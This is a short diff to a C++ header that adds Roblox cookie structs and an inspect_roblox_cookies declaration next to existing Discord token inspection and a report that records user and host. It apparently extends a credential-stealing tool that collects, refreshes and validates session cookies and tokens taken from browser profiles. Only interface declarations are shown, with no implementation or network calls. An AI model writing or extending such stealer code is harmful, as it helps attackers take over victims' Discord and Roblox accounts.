@@ -51,6 +51,28 @@ std::vector<discord_account> inspect_discord_tokens(
     const std::vector<discord_token_input>& tokens);
 std::string describe_account(const discord_account& account, bool full_token = false);
 
+struct roblox_cookie_input {
+    std::string source;
+    std::string profile;
+    std::string cookie;
+};
+
+struct roblox_account {
+    std::string source;
+    std::string profile;
+    std::string cookie;
+    std::string source_cookie;
+    bool refreshed = false;
+    bool valid = false;
+    std::string id;
+    std::string username;
+    std::string display_name;
+    std::string error;
+};
+
+std::vector<roblox_account> inspect_roblox_cookies(
+    const std::vector<roblox_cookie_input>& cookies);
+
 struct discord_report {
     std::string user;
     std::string host;
